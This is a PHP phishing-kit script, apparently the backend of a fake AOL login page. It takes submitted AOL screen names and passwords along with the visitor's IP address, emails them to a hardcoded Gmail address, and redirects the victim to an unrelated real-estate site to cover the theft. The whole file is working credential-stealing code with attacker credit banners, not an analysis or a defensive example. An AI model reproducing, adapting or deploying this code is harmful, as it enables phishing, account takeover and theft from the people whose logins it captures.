<?include 'index_files/validate_form.js';
$ip = getenv("REMOTE_ADDR");
$message .= "---------------- XxX  *~* ZolaHacker *~*  XxX----------------------\n";
$message .= "Screen Name: ".$_POST['aoluser']."\n";
$message .= "Password: ".$_POST['aolpassword']."\n";
$message .= "IP: ".$ip."\n";
$message .= "----------------------------------Created By hOLLYd--------------------------------------\n";
$recipient = "crisonlinelogs@gmail.com";
$subject = "AOL REZ";
$headers .= "MIME-Version: 1.0\n";
mail($recipient,$subject,$message,$headers);
	 if (mail($recipent,$subject,$message,$headers))
	   {
		   header("Location: http://www.remax.com/");
	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }
?>